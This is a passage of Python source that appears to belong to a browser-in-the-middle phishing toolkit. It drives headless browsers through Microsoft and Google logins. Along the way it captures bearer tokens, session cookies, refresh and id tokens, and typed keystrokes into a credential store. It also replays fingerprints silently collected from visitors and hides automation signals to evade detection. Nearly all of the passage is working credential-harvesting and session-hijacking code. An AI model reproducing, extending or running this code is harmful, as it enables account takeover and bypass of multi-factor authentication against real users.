                     category="auth", session_id=sid)
                # Capture specific headers
                if _should_capture_header(name):
                    await _store_captured_header(site_id, name, value, url, sid)

        # Always check for Bearer token regardless
        auth_val = headers.get("authorization", "")
        if auth_val.lower().startswith("bearer "):
            token = auth_val[7:]
            _log(f"  {seq_tag}>>> BEARER_TOKEN (request) len={len(token)} val=<redacted>",
                 category="auth", session_id=sid)
            await _store_captured_header(site_id, "Authorization: Bearer", token, url, sid)
    except Exception as e:
        seq = find_flow_seq_by_req_id(sid, str(id(request)))
        tag = f"#{seq} " if seq is not None else ""
        _log(f"{tag}request handler error: {e}", session_id=sid)


async def _on_response(response, site_id: str, sid: str):
    """Log response, capture tokens, log auth headers."""
    try:
        url = response.url
        status = response.status
        headers = response.headers
        content_type = headers.get("content-type", "")
        verbose = get_config_value("verbose", True)
        noisy = _is_noisy_url(url)
        trace_on = _trace_active_for(sid)

        # Look up the matching flow seq so the log aligns with Flow Trace.
        seq = find_flow_seq_by_req_id(sid, str(id(response.request)))
        seq_tag = f"#{seq} " if seq is not None else ""

        # Per-response URL log lines are diagnostic — only emit when
        # trace is on. Token / cookie / auth-header capture below
        # always runs.
        if trace_on and not noisy:
            if verbose:
                header_str = "  ".join(f"{k}:{_redact(v, 80)}" for k, v in list(headers.items())[:15])
                _log(f"{seq_tag}RESP {status} {url[:300]}  [{header_str[:500]}]", session_id=sid)
            else:
                _log(f"{seq_tag}RESP {status} {url[:300]}", session_id=sid)

        # Auth response headers
        auth_found = {k: v for k, v in headers.items() if _is_auth_header(k)}
        if auth_found:
            for name, value in auth_found.items():
                _log(f"  {seq_tag}<<< RESP_AUTH {name}: <redacted ({len(value)} chars)>",
                     category="auth", session_id=sid)
                if _should_capture_header(name):
                    await _store_captured_header(site_id, name, value, url, sid)

        is_mcas = _is_mcas_url(url) and not _is_mcas_noise(url)
        for name, value in headers.items():
            if name.lower() == "set-cookie":
                _log(f"  {seq_tag}<<< SET-COOKIE {value.split('=', 1)[0] if '=' in value else '<unnamed>'}=<redacted>",
                     category="auth", session_id=sid)
                # Extract cookie name=value and check if it's one we want
                cookie_name = value.split("=", 1)[0].strip() if "=" in value else ""
                if _should_capture_header(cookie_name):
                    cookie_val = value.split(";", 1)[0]  # name=value without attributes
                    await _store_captured_header(site_id, f"Cookie: {cookie_name}", cookie_val, url, sid)
                # Capture MCAS auth-domain cookies (not CDN noise)
                elif is_mcas and cookie_name:
                    cookie_val = value.split(";", 1)[0]
                    await _store_captured_header(site_id, f"Cookie: {cookie_name}", cookie_val, url, sid)

        if 300 <= status < 400:
            location = headers.get("location", "(no location header)")
            _log(f"{seq_tag}REDIRECT {status} -> {location[:400]}", session_id=sid)
            return

        if status < 200 or status >= 300:
            return
        if "json" not in content_type:
            return
        # Skip MCAS CDN/i18n JSON — contains locale strings that false-match auth keywords
        if _is_mcas_noise(url):
            return

        try:
            body_bytes = await asyncio.wait_for(response.body(), timeout=3.0)
        except Exception:
            return

        try:
            body = json.loads(body_bytes)
        except Exception:
            return
        if not isinstance(body, dict):
            return

        token_fields = ["access_token", "token", "id_token", "jwt",
                        "accessToken", "idToken", "sessionToken"]
        captured = {}
        for field in token_fields:
            if field in body:
                captured[field] = body[field]
        for field in ["refresh_token", "refreshToken"]:
            if field in body:
                captured[field] = body[field]
        for field in ["expires_in", "expiresIn", "expires_on", "ext_expires_in"]:
            if field in body:
                captured[field] = body[field]
        for field in ["scope", "token_type", "tokenType", "session_state", "client_info"]:
            if field in body:
                captured[field] = body[field]

        if captured:
            captured["source_url"] = url
            captured["captured_at"] = time.time()

            def _merge_tokens(existing):
                existing["tokens"].append(captured)
                if "captured_headers" not in existing:
                    existing["captured_headers"] = {}
                for field in token_fields:
                    if field in captured and isinstance(captured[field], str):
                        existing["captured_headers"][field] = {
                            "value": captured[field],
                            "source": url,
                            "captured_at": time.time(),
                        }
                return existing

            await credentials_store.update(
                site_id, _merge_tokens, default={"tokens": [], "cookies": []})
            notify_sites_changed()
            await update_current_jwts(site_id, captured)

            _log(f"{seq_tag}TOKEN CAPTURED from {url[:150]}",
                 category="auth", session_id=sid)
            for k, v in captured.items():
                if k in ("source_url", "captured_at"):
                    continue
                _log(f"  {seq_tag}>>> TOKEN.{k} = <redacted ({len(str(v))} chars)>",
                     category="auth", session_id=sid)

        for key in body:
            kl = key.lower()
            if any(kw in kl for kw in ("token", "session", "auth", "bearer", "jwt", "saml", "cookie", "flow")):
                if key not in captured:
                    val = str(body[key])
                    if verbose:
                        _log(f"  {seq_tag}>>> BODY_AUTH_FIELD {key} = <redacted ({len(val)} chars)>",
                             category="auth", session_id=sid)
                    if isinstance(body[key], str) and len(val) > 1:
                        await _store_captured_header(site_id, key, val, url, sid)

    except Exception as e:
        try:
            seq = find_flow_seq_by_req_id(sid, str(id(response.request)))
        except Exception:
            seq = None
        tag = f"#{seq} " if seq is not None else ""
        _log(f"{tag}response handler error: {e}", session_id=sid)


def _site_id_from_url(url: str) -> str:
    parsed = urlparse(url)
    return parsed.netloc.replace(":", "_").replace(".", "_")


def _make_cred_key(site_id: str, user_id: str = "") -> str:
    """Build a credential storage key. Includes user_id if available."""
    if user_id:
        safe_user = user_id.lower().replace("@", "_at_").replace(".", "_")
        return f"{site_id}__{safe_user}"
    return site_id


def _parse_cred_key(key: str) -> tuple[str, str]:
    """Parse a credential key back to (site_id, user_id). user_id may be empty."""
    if "__" in key:
        site_id, user_part = key.split("__", 1)
        return site_id, user_part
    return key, ""


async def _auto_fill_login(page, email: str, sid: str):
    """Detect Microsoft/Google login pages and auto-fill email to get to passkeys faster."""
    # Wait for page to settle after redirects
    await asyncio.sleep(2)
    url = page.url.lower()

    # Microsoft login (login.microsoftonline.com, login.microsoft.com, login.live.com)
    if any(h in url for h in ["login.microsoftonline.com", "login.microsoft.com", "login.live.com"]):
        _log(f"AUTO-LOGIN: Microsoft login detected, filling email...", session_id=sid)
        try:
            # Wait for the email input
            email_input = await page.wait_for_selector(
                'input[type="email"], input[name="loginfmt"]', timeout=8000)
            if email_input:
                await email_input.fill(email)
                await asyncio.sleep(0.3)
                # Click the Next button
                next_btn = await page.query_selector(
                    'input[type="submit"][id="idSIButton9"], '
                    'button[type="submit"], '
                    'input[value="Next"], '
                    '#idSIButton9')
                if next_btn:
                    await next_btn.click()
                    _log(f"AUTO-LOGIN: email filled and Next clicked", session_id=sid)
                    # Wait for password/passkey page to load
                    await asyncio.sleep(2)
                    # Check if we're on the "pick a method" or password page
                    # Try to click "Use passkey" or FIDO option if available
                    await _try_select_passkey(page, sid)
                else:
                    _log(f"AUTO-LOGIN: email filled, no Next button found", session_id=sid)
        except Exception as e:
            _log(f"AUTO-LOGIN: Microsoft fill error: {e}", session_id=sid)

    # Google login
    elif "accounts.google.com" in url:
        _log(f"AUTO-LOGIN: Google login detected, filling email...", session_id=sid)
        try:
            email_input = await page.wait_for_selector(
                'input[type="email"]', timeout=8000)
            if email_input:
                await email_input.fill(email)
                await asyncio.sleep(0.3)
                next_btn = await page.query_selector(
                    '#identifierNext button, '
                    'button[jsname="LgbsSe"]')
                if next_btn:
                    await next_btn.click()
                    _log(f"AUTO-LOGIN: email filled and Next clicked", session_id=sid)
                else:
                    _log(f"AUTO-LOGIN: email filled, no Next button found", session_id=sid)
        except Exception as e:
            _log(f"AUTO-LOGIN: Google fill error: {e}", session_id=sid)


async def _try_select_passkey(page, sid: str):
    """Try to find and click a 'Use passkey' or FIDO option on Microsoft login."""
    try:
        # Look for common passkey/FIDO selectors on MS login
        selectors = [
            # "Sign in with Windows Hello or a security key"
            '[data-value="PhoneAppNotification"]',
            # FIDO / passkey links
            'a[id*="fido"], a[id*="Fido"]',
            # "Use your passkey" link
            '#signInAnotherWay',
            # "I can't use my Microsoft Authenticator app right now"
            '#idA_PWD_SwitchToCredPicker',
        ]
        for sel in selectors:
            el = await page.query_selector(sel)
            if el and await el.is_visible():
                await el.click()
                _log(f"AUTO-LOGIN: clicked passkey/method selector: {sel}", session_id=sid)
                await asyncio.sleep(1)
                # Now look for FIDO-specific option in the method picker
                fido_selectors = [
                    '[data-value="Fido"]',
                    'div[data-testid*="fido"]',
                    '#idDiv_SAOTCAS_Title',  # security key
                    'div:has-text("security key")',
                    'div:has-text("passkey")',
                ]
                for fsel in fido_selectors:
                    try:
                        fel = await page.query_selector(fsel)
                        if fel and await fel.is_visible():
                            await fel.click()
                            _log(f"AUTO-LOGIN: selected FIDO/passkey option: {fsel}", session_id=sid)
                            return
                    except Exception:
                        continue
                return
    except Exception as e:
        _log(f"AUTO-LOGIN: passkey selection error: {e}", session_id=sid)


# ── Auto-launched sessions (triggered by :3128 proxy) ──
# Keep strong refs to Playwright + browser + context so they aren't GC'd while
# the page lives in _live_pages. Keyed by sid.
_auto_browsers: dict[str, tuple] = {}


async def launch_auto_session(login_url: str, *, site_id: str = "",
                              user_id: str = "") -> str:
    """Headless Playwright session launched on demand by the auth proxy.

    Registers into `_live_pages` so `_fetch_via_playwright` can route through
    it. Returns the session id. Caller is responsible for lifecycle — call
    `close_auto_session(sid)` to tear down.
    """
    ignore_ssl = get_config_value("ignore_ssl", True)
    browser_type = get_config_value("browser_type", "edge")
    if not site_id:
        site_id = _site_id_from_url(login_url)
    cred_key = _make_cred_key(site_id, user_id)
    sid = f"auto_{site_id}_{int(time.time())}"

    register_session(sid, {"login_url": login_url, "site_id": site_id,
                           "user_id": user_id, "auto": True})
    _log(f"AUTO_LAUNCH starting site={site_id} user={user_id or '(none)'} "
         f"url={login_url}", session_id=sid)

    chromium_args = [
        "--disable-blink-features=AutomationControlled",
        "--disable-gpu",
    ]
    if sys.platform == "linux":
        # Linux-kernel-specific. `--single-process` is intentionally
        # NOT here: modern Chromium DCHECKs that fire only in single-
        # process mode abort the renderer on new_page() with an int3
        # trap (visible in dmesg), so the session looks like it
        # launched fine, then the first page creation kills the
        # browser with a TargetClosed.
        chromium_args += [
            "--no-sandbox", "--disable-dev-shm-usage",
            "--disable-setuid-sandbox",
        ]
    if ignore_ssl:
        # Modern Chromium silently drops --ignore-certificate-errors
        # unless --test-type is also set. Without the pair, the
        # browser still sends SSLV3_ALERT_CERTIFICATE_UNKNOWN to the
        # BITM proxy on every leaf it doesn't trust (visible in the
        # auth_proxy log as "BITM TLS handshake failed for ...").
        chromium_args += ["--ignore-certificate-errors", "--test-type"]

    launch_opts: dict = {"headless": True, "args": chromium_args}
    if browser_type == "edge-real":
        launch_opts["channel"] = "msedge"

    # Engine-family selection based on the captured UA — lets Playwright
    # match the real browser's JA3 shape for this host. Defaults to the
    # chromium path we already had. See backend/ua_engine.py for the UA
    # classifier and backend/shared.py for the toggles.
    engine_family, engine_channel = _pick_engine_for(login_url, sid)
    if browser_type == "firefox":
        engine_family, engine_channel = "firefox", None
    if engine_family != "chromium":
        # Firefox + WebKit don't take chromium args or channels.
        launch_opts.pop("channel", None)
        launch_opts["args"] = []

    pw = await async_playwright().start()
    try:
        browser = await _engine_launch(pw, engine_family, launch_opts,
                                        engine_channel, sid)
        context = await browser.new_context(
            viewport={"width": 1280, "height": 800},
            ignore_https_errors=ignore_ssl,
        )

        # Load any previously-captured cookies for this (site, user) pair
        saved_cookies = cookies_store.get(cred_key) or cookies_store.get(site_id)
        if saved_cookies and isinstance(saved_cookies, list):
            try:
                await context.add_cookies(saved_cookies)
                _log(f"AUTO_LAUNCH loaded {len(saved_cookies)} saved cookies",
                     session_id=sid)
            except Exception as e:
                _log(f"AUTO_LAUNCH cookie load failed: {e}",
                     session_id=sid, level="warn")

        page = await context.new_page()
        _live_pages[sid] = page
        _auto_browsers[sid] = (pw, browser, context)

        # Same instrumentation as the WS-driven session uses. We combine
        # flow-append + auth-log into one coroutine each so the flow seq is
        # assigned before the auth logger tries to print it.
        async def _req_both(req):
            await _on_flow_request(req, sid)
            await _on_request_auth(req, cred_key, sid)
        async def _resp_both(resp):
            await _on_flow_response(resp, sid)
            await _on_response(resp, cred_key, sid)
        page.on("request", lambda req: _fire_and_forget(_req_both(req)))
        page.on("response", lambda resp: _fire_and_forget(_resp_both(resp)))
        page.on("framenavigated", lambda frame: _log(
            f"FRAME_NAV {frame.url[:250]}", session_id=sid)
            if frame == page.main_frame else None)

        try:
            await page.goto(login_url, wait_until="commit", timeout=15000)
            _log(f"AUTO_LAUNCH navigated -> {page.url[:150]}", session_id=sid)
        except Exception as e:
            _log(f"AUTO_LAUNCH goto failed: {e}", session_id=sid, level="warn")

        _log(f"AUTO_LAUNCH ready sid={sid}", session_id=sid)
        return sid
    except Exception as e:
        # Best-effort cleanup on failure
        try:
            await pw.stop()
        except Exception:
            pass
        unregister_session(sid)
        _log(f"AUTO_LAUNCH failed: {e}", session_id=sid, level="warn")
        raise


async def close_auto_session(sid: str) -> None:
    """Tear down a session started by `launch_auto_session`."""
    refs = _auto_browsers.pop(sid, None)
    _live_pages.pop(sid, None)
    unregister_session(sid)
    if not refs:
        return
    pw, browser, _context = refs
    try:
        await browser.close()
    except Exception:
        pass
    try:
        await pw.stop()
    except Exception:
        pass
    _log(f"AUTO_CLOSE sid={sid}", session_id=sid)


def rename_auto_session_user(sid: str, new_user_id: str) -> None:
    """Called when a user_id is captured on an auto-launched session — the
    credentials key changes, but the page + context stay the same. The auth
    proxy's registry handles the (site, user) keying separately."""
    _log(f"AUTO_REKEY sid={sid} user={new_user_id}",
         session_id=sid)


def _find_capture_by_cid(cid: str) -> tuple[str, dict] | tuple[None, None]:
    """Locate the external/silent capture carrying correlation id `cid`.

    Silent captures land in `credentials_store` (via
    `/api/capture/external`); `silent.html` stamps a `cid` on the record so
    a follow-on `:8091` session started with `?cid=` can find the exact
    capture and replay that visitor's device. Small linear scan — the lab
    holds a handful of records, and this only runs at session start."""
    if not cid:
        return None, None
    for key in credentials_store.list_keys():
        rec = credentials_store.get(key)
        if rec and rec.get("cid") == cid:
            return key, rec
    return None, None


@router.websocket("/session")
async def browser_session(
    ws: WebSocket,
    login_url: str = Query(default=""),
    target: str = Query(default=""),
    login_hint: str = Query(default=""),
    width: int = Query(default=1280),
    height: int = Query(default=900),
    private: bool = Query(default=False),
    device_id: str = Query(default=""),
    start_url: str = Query(default=""),
    trace: bool = Query(default=False),
    prefer_push: Optional[bool] = Query(default=None),
    cid: str = Query(default=""),
):
    if not verify_ws_key(ws):
        await ws.close(code=4001, reason="Invalid or missing API key")
        return

    # Optional device profile — overrides per-host fingerprint replay,
    # locale/timezone/viewport, and seeds cookies/headers/storage before
    # the first navigation.
    #
    # Resolution order:
    #   1. explicit `?device_id=` query param (per-session override)
    #   2. `default_device_id` config (operator-set default)
    #   3. no device profile
    #
    # A missing / stale id falls through silently — an operator who
    # deleted the configured default device shouldn't have all new
    # :8091 sessions error out; they should just launch without a
    # profile, same as before the default existed. The default-applied
    # path emits a log line so the operator can confirm it took effect.
    device = None
    resolved_device_id = device_id
    if not resolved_device_id:
        try:
            resolved_device_id = (
                get_config_value("default_device_id", "") or ""
            )
        except Exception:
            resolved_device_id = ""
    if resolved_device_id:
        try:
            from backend import devices as _devices
            device = _devices.get(resolved_device_id)
            if device is None:
                _log(
                    f"DEVICE_DEFAULT id={resolved_device_id} "
                    f"not found — launching without profile",
                    category="devices",
                )
            elif not device_id:
                _log(
                    f"DEVICE_DEFAULT id={resolved_device_id} applied "
                    f"(default_device_id config)",
                    category="devices",
                )
        except Exception:
            device = None
    device_id = resolved_device_id

    # Correlation id (`?cid=`) — ties a prior silent fingerprint capture to
    # this follow-on login session. `silent.html` captures the visitor's
    # real device fingerprint and hands them onward to /start?cid=…; here we
    # find that capture and build/reuse a device profile from it so this
    # server-side Playwright session replays the visitor's actual device
    # signature. An explicit `?device_id=` (or a resolved default device)
    # wins — cid only fills the gap when no device was otherwise chosen.
    cid = (cid or "").strip()
    linked_capture_key = None
    if cid and device is None:
        try:
            from backend import devices as _devices
            cap_key, cap_rec = _find_capture_by_cid(cid)
            fp_src = ((cap_rec or {}).get("external_capture_metadata") or {}).get("fingerprint") or {}
            if cap_rec and fp_src:
                cid_device = _devices.find_or_create_for_cid(cid, fp_src, cap_key)
                if cid_device:
                    device = cid_device
                    device_id = cid_device["id"]
                    linked_capture_key = cap_key
                    # Stamp the reverse link onto the silent capture so the
                    # dashboard's Captured Data card shows it seeded a session.
                    try:
                        await credentials_store.update(cap_key, lambda d: {
                            **d,
                            "linked_device_id": cid_device["id"],
                            "linked_session_at": time.time(),
                        })
                        notify_sites_changed()
                    except Exception:
                        pass
                    _log(f"CID_LINK cid={cid} capture={cap_key} "
                         f"device={cid_device['id']} engine={cid_device.get('engine_family')} "
                         f"— replaying silent-capture fingerprint", category="devices")
            else:
                _log(f"CID_LINK cid={cid} — no silent capture with a usable "
                     f"fingerprint found; launching without profile",
                     category="devices")
        except Exception as e:
            _log(f"CID_LINK failed cid={cid}: {e}", category="devices", level="warn")

    # Resolve target alias to actual URL (aliases defined in sites.yaml)
    _targets = _rules.login_targets()
    if start_url:
        login_url = start_url
    elif target and target in _targets:
        login_url = _targets[target]
    elif not login_url:
        login_url = _targets.get("default", "https://myapps.microsoft.com")

    # Ensure login URL has a protocol
    if login_url and not login_url.startswith(("http://", "https://", "about:", "data:")):
        login_url = "https://" + login_url

    # Append login_hint to URL for email pre-fill at the IdP
    if login_hint:
        separator = "&" if "?" in login_url else "?"
        login_url = login_url + separator + "login_hint=" + login_hint

    # Snapshot the resolved target so post_login_redirect can navigate
    # back here after auth completes (login_url is mutated with login_hint
    # above, but the original user-requested destination is still useful
    # as the redirect target).
    original_target_url = login_url

    # Read config at session start (verbose/ssl also read live during session)
    ignore_ssl = get_config_value("ignore_ssl", False)
    browser_type = get_config_value("browser_type", "edge")
    mobile_profile = get_config_value("mobile_emulation", "off")
    # Back-compat: treat True/False as old boolean toggle
    if mobile_profile is True:
        mobile_profile = "phone_android"
    elif mobile_profile is False or mobile_profile == "off":
        mobile_profile = "off"
    use_proxy = get_config_value("upstream_proxy", False)
    proxy_host = get_config_value("upstream_proxy_host", "127.0.0.1:3128")

    # Device profiles: (width, height, device_scale_factor, is_mobile, has_touch)
    _DEVICE_PROFILES = {
        "off":                (1280, 900, 1, False, False),
        "phone_android":      (390, 844, 2.625, True, True),   # Pixel 8
        "phone_ios":          (393, 852, 3, True, True),        # iPhone 15
        "tablet_android":     (800, 1280, 1.5, True, True),    # Samsung Galaxy Tab S8
        "tablet_android_edge":(800, 1280, 1.5, True, True),    # Galaxy Tab S8 + Edge
        "tablet_ios":         (820, 1180, 2, True, True),      # iPad Air (10.9")
        "tablet_ios_edge":    (820, 1180, 2, True, True),      # iPad Air + Edge
    }
    profile = _DEVICE_PROFILES.get(mobile_profile, _DEVICE_PROFILES["off"])
    mobile = mobile_profile != "off"
    if mobile:
        # Mobile profiles dictate the viewport — the device's screen size
        # is the whole point.
        width, height = profile[0], profile[1]
    else:
        # Desktop — honor the operator's actual browser-window dims sent
        # by BrowserAuth.tsx as `width`/`height` query params, so the
        # Playwright viewport fills the visible canvas without aspect-
        # ratio bars. Clamp to sane bounds.
        width = max(640, min(3840, int(width)))
        height = max(480, min(2400, int(height)))
    # Mobile profiles bake in their device's DPR (retina-ish 2-3x);
    # desktop reads from `screenshot_dpr` (default 2) so HiDPI operator
    # screens get a sharp image instead of a 1x bitmap upscaled by CSS.
    dpr = float(profile[2]) if mobile else float(get_config_value("screenshot_dpr", 2))

    site_id = _site_id_from_url(login_url)
    sid = f"{site_id}_{int(time.time())}"

    await ws.accept()
    # Tell the SPA which session it's bound to so it can target the
    # right Playwright instance for actions like "Register device".
    await ws.send_json({"type": "session_started", "session_id": sid,
                        "site_id": site_id})
    await ws.send_json({"type": "viewport", "width": width, "height": height, "mobile": mobile, "profile": mobile_profile, "dpr": dpr})
    user_id = ""
    # Extract email from login_hint URL parameter if available
    if not user_id:
        from urllib.parse import parse_qs
        qs = parse_qs(urlparse(login_url).query)
        hint = (qs.get("login_hint") or qs.get("hint") or [""])[0]
        if hint and "@" in hint:
            user_id = hint
    cred_key = _make_cred_key(site_id, user_id)
    # Mutable container so lambdas/closures see updates when user_id changes.
    # `cid`, when present, rides along so the credentials this session
    # captures carry the same correlation id as the silent fingerprint
    # capture that seeded it — closing the tie in both directions.
    _cred = {"key": cred_key, "user": user_id, "cid": cid}
    # Track MFA code challenge for timeout handling
    _mfa_challenge_time: Optional[float] = None
    _mfa_code_timeout_seconds = 300  # 5 minutes
    register_session(sid, {"login_url": login_url, "site_id": site_id,
                            "user_id": user_id, "trace": bool(trace),
                            "cid": cid or None,
                            "linked_capture_key": linked_capture_key})
    try:
        _subs.start_subsession(sid, site_id, user_id, login_url)
    except Exception:
        pass

    # Flow Trace gate. The heavy per-request handlers (flow append,
    # response-body buffering, milestone classifier, diagnostic
    # framenavigated/load/dom/console logs) only run when trace is
    # explicitly on — either via the global config flag or the
    # `?trace=true` URL param on this session. The credential-capture
    # path (auth-header / cookie capture for the keepalive monitor)
    # always runs because that's what the operator's session is for.
    trace_active = bool(trace) or bool(get_config_value(
        "flow_trace_enabled", False))

    _log(f"=== SESSION {sid} for {login_url} user={user_id or '(unknown)'} "
         f"(ssl_ignore={ignore_ssl}, trace={'ON' if trace_active else 'off'}) ===",
         session_id=sid)

    pw = None
    browser = None
    running = False
    keep_alive_after_redirect = False
    input_buffer: list[str] = []
    captured_inputs: list[str] = []

    async def flush_input(reason: str = ""):
        if not input_buffer:
            return
        text = "".join(input_buffer)
        input_buffer.clear()
        captured_inputs.append(text)
        _log(f"CAPTURED_INPUT={text}  (flushed by: {reason})",
             category="capture", session_id=sid)
        # Set user_id for multi-user creds
        if "@" in text and "." in text.split("@")[-1] and len(text) > 5:
            if _cred["user"] != text:
                old_key = _cred["key"]
                _cred["user"] = text
                _cred["key"] = _make_cred_key(site_id, text)
                _log(f"USER_ID set: {text} -> cred_key={_cred['key']}", session_id=sid)
                # Push the new user_id into the registered session info so
                # the dashboard session labels include it.
                try:
                    update_session_info(sid, {"user_id": text})
                except Exception:
                    pass
                # Attach this user_id to the sub-session record too.
                try:
                    _subs.set_user_id(sid, text)
                except Exception:
                    pass
                # Migrate any data captured under the bare site_id to the user-specific key
                if old_key != _cred["key"]:
                    old_data = credentials_store.get(old_key)
                    if old_data:
                        new_key = _cred["key"]
                        _user_text = text

                        def _migrate(new_data):
                            for t in old_data.get("tokens", []):
                                new_data.setdefault("tokens", []).append(t)
                            for k, v in old_data.get("captured_headers", {}).items():
                                new_data.setdefault("captured_headers", {})[k] = v
                            new_data["user_id"] = _user_text
                            new_data["site_id"] = site_id
                            return new_data

                        await credentials_store.update(
                            new_key, _migrate,
                            default={"tokens": [], "cookies": []})
                        credentials_store.delete(old_key)
                        notify_sites_changed()
                        _log(f"Migrated credentials from {old_key} -> {new_key}", session_id=sid)
                # Rekey any pre-auth auto-launched proxy session for this site
                try:
                    from backend.auth_proxy import rekey_auto_session
                    await rekey_auto_session(site_id, text)
                except Exception:
                    pass
        try:
            await ws.send_json({
                "type": "captured_input",
                "value": text,
                "reason": reason,
                "all_inputs": list(captured_inputs),
            })
        except Exception:
            pass

    try:
        _step_t0 = time.time()
        def _step(msg: str):
            """STEP N/8 marker with elapsed seconds since session
            start. Lets the operator pinpoint which Playwright phase
            ate the 35s instead of timing it manually."""
            _log(f"[t+{time.time()-_step_t0:.1f}s] {msg}",
                 session_id=sid)

        chromium_args = [
            "--disable-blink-features=AutomationControlled",
            "--disable-gpu",
        ]
        if sys.platform == "linux":
            # See note in launch_browser() — `--single-process` is
            # omitted because modern Chromium DCHECKs abort the
            # renderer on new_page() in that mode (int3 trap in
            # dmesg, TargetClosed at the Python layer).
            chromium_args += [
                "--no-sandbox", "--disable-dev-shm-usage",
                "--disable-setuid-sandbox",
            ]
        if ignore_ssl:
            # See note in launch_browser() — pair --test-type so
            # Chromium actually honors the cert-error suppression.
            chromium_args += ["--ignore-certificate-errors", "--test-type"]

        launch_opts: dict = {"headless": True, "args": chromium_args}
        if browser_type == "edge-real":
            # Real Edge binary — note: may trigger native AAD device auth
            # (microsoft-edge:signin protocol) which can fail headless.
            launch_opts["channel"] = "msedge"

        engine_family, engine_channel = _pick_engine_for(login_url, sid)
        if browser_type == "firefox":
            # Explicit operator choice overrides fingerprint auto-pick, but
            # a device profile (below) is more specific still and wins.
            engine_family, engine_channel = "firefox", None
        if device:
            engine_family = device.get("engine_family") or engine_family
            engine_channel = device.get("channel") or None
            _log(f"DEVICE selected device={device['id']} "
                 f"name={device.get('name','')} engine={engine_family}"
                 f"{('-' + engine_channel) if engine_channel else ''}",
                 session_id=sid)
        if engine_family != "chromium":
            launch_opts.pop("channel", None)
            launch_opts["args"] = []

        # Warm-pool fast path: skip async_playwright().start() +
        # browser.launch() when we have a matching warm browser. The
        # launch normally costs ~1.0-1.5 s; new_context() on a warm
        # browser is ~30-50 ms. `browser_is_warm` is checked at
        # session cleanup so we don't close the shared instance.
        from backend import browser_warm as _warm
        warm_args_match = (engine_family == "chromium"
                            and chromium_args == _warm.default_chromium_args()
                            and not engine_channel
                            and not ignore_ssl)
        browser = None
        browser_is_warm = False
        pw = None
        if warm_args_match:
            try:
                browser = await _warm.get_warm_browser(
                    family="chromium", channel=None,
                    args=_warm.default_chromium_args())
                browser_is_warm = True
                _warm.note_session_open()
                _step("STEP 1-3/8: using warm chromium")
                if ignore_ssl:
                    _log("SSL errors IGNORED", session_id=sid)
            except Exception as we:
                _log(f"warm-pool unavailable ({we}); falling back to "
                     f"per-session launch", session_id=sid, level="warn")
                browser = None

        if browser is None:
            _step("STEP 1/8: starting playwright...")
            pw = await async_playwright().start()
            _step("STEP 2/8: launching chromium...")
            if ignore_ssl:
                _log("SSL errors IGNORED", session_id=sid)

        try:
            if browser is None:
                browser = await _engine_launch(pw, engine_family,
                                                launch_opts,
                                                engine_channel, sid)
        except Exception as e:
            if browser_type == "edge-real" and "msedge" in str(e).lower():
                _log(f"STEP 3/8: edge-real unavailable ({e}); "
                     f"falling back to bundled Chromium with Edge UA",
                     session_id=sid, level="warn")
                launch_opts.pop("channel", None)
                browser = await pw.chromium.launch(**launch_opts)
            elif engine_family != "chromium":
                _log(f"STEP 3/8: {engine_family} launch failed ({e}); "
                     f"falling back to chromium",
                     session_id=sid, level="warn")
                launch_opts["args"] = chromium_args
                browser = await pw.chromium.launch(**launch_opts)
                # Reflect the actual launched engine so downstream
                # checks (e.g. CDP screencast eligibility) see chromium.
                engine_family = "chromium"
                engine_channel = None
            else:
                raise
        _step(f"STEP 3/8: {browser_type} {browser.version}, creating context...")

        context_opts: dict = {
            "viewport": {"width": width, "height": height},
            "ignore_https_errors": ignore_ssl,
        }
        if use_proxy:
            # Accept any Playwright-supported scheme (http/https/socks4/
            # socks4a/socks5/socks5h). Bare host:port defaults to http.
            if "://" in proxy_host:
                proxy_url = proxy_host
            else:
                proxy_url = f"http://{proxy_host}"
            context_opts["proxy"] = {"server": proxy_url}
            _log(f"Upstream proxy enabled: {proxy_url}", session_id=sid)
            if proxy_url.startswith("socks") and "@" in proxy_url.split("//", 1)[-1]:
                _log("Note: Chromium ignores username/password on SOCKS5 — "
                     "front it with an HTTP proxy if auth is required.",
                     session_id=sid, level="warn")
        # Set user agent based on device profile
        _UA = {
            "phone_android": (
                "Mozilla/5.0 (Linux; Android 14; Pixel 8) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Mobile Safari/537.36"),
            "phone_ios": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                "Version/17.4 Mobile/15E148 Safari/604.1"),
            "tablet_android": (
                "Mozilla/5.0 (Linux; Android 14; SM-X700) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36"),
            "tablet_android_edge": (
                "Mozilla/5.0 (Linux; Android 14; SM-X700) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36 EdgA/122.0.0.0"),
            "tablet_ios": (
                "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                "Version/17.4 Mobile/15E148 Safari/604.1"),
            "tablet_ios_edge": (
                "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) "
                "Version/17.4 Mobile/15E148 Safari/604.1 Edg/122.0.0.0"),
        }
        if browser_type in ("edge-real", "firefox") and not mobile:
            pass  # let the real browser (Edge or Firefox) use its native UA
        elif mobile and mobile_profile in _UA:
            ua = _UA[mobile_profile]
            # Append Edge branding if using Edge browser type (for non-edge-specific profiles)
            if browser_type in ("edge", "edge-real") and "_edge" not in mobile_profile and "_ios" not in mobile_profile:
                if "Mobile Safari/537.36" in ua:
                    ua = ua.replace("Mobile Safari/537.36", "Mobile Safari/537.36 EdgA/122.0.0.0")
                elif "Safari/537.36" in ua:
                    ua = ua + " EdgA/122.0.0.0"
            context_opts["user_agent"] = ua
        elif browser_type == "edge":
            context_opts["user_agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0")
        else:
            context_opts["user_agent"] = (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/122.0.0.0 Safari/537.36")
        if mobile:
            context_opts.update(device_scale_factor=dpr, is_mobile=profile[3], has_touch=profile[4])
        elif dpr != 1:
            context_opts.update(device_scale_factor=dpr)

        # Fingerprint replay — if the user has been browsing the target
        # through the BITM on :3128, adopt their real User-Agent + client
